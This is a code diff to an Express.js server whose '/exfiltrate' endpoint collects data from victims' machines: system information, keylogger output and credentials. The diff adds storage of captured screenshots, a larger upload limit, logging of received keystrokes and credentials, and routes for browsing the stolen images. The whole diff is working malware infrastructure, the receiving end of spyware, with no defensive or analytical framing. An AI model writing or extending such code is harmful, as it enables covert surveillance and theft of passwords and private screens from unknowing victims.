@@ -10,7 +10,7 @@ const __dirname = path.dirname(__filename);
 const app = express();
 const PORT = 3000;
 
-app.use(express.json());
+app.use(express.json({ limit: "50mb" }));
 
 var links = new Array();
 var system_info;
@@ -44,16 +44,34 @@ app.post('/exfiltrate', (req, res) => {
             fs.writeFileSync(filePath, csvHeader + csvContent, "utf8");
             break;
         case 'os':
+            console.log("Keylogger updated");
             system_info = data;
             break;
 
         case 'keys':
+            console.log("Keylogger updated");
             keylogger_info = data;
             break;
 
        case 'credentials':
+            console.log("credentials recorded");
             credentials = data;
             break;
+
+       case 'screenshot':
+            const base64Data = data.replace(/^data:image\/png;base64,/, "");
+            const ss_path = path.join(__dirname, "/csv/images", `screenshot_${Date.now()}.png`);
+
+            fs.writeFile(ss_path, base64Data, "base64", (err) => {
+                if (err) {
+                    console.error("Error saving screenshot:", err);
+                    return res.status(500).send("Failed to save screenshot");
+                }
+                console.log("Screenshot saved:", ss_path);
+
+            });
+            break;
+
 
 
 //        default:
@@ -90,6 +108,26 @@ app.get('/get-keys', (req, res) => {
 app.get('/get-credentials', (req, res) => {
     res.json(credentials);
 });
+
+app.use("/images", express.static(path.join(__dirname, "csv/images")));
+
+app.get("/get-images", (req, res) => {
+    const imagesDir = path.join(__dirname, "csv/images");
+
+    fs.readdir(imagesDir, (err, files) => {
+        if (err) {
+            console.error("Error reading images directory:", err);
+            return res.status(500).send("Failed to load images");
+        }
+
+        // Sort images by newest first (based on timestamp in filename)
+        files.sort((a, b) => b.localeCompare(a));
+
+        // Send list of image URLs
+        res.json(files.map(file => `/images/${file}`));
+    });
+});
+
 
 app.listen(PORT, () => {
     console.log(`Server running on: http://localhost:${PORT}/`);
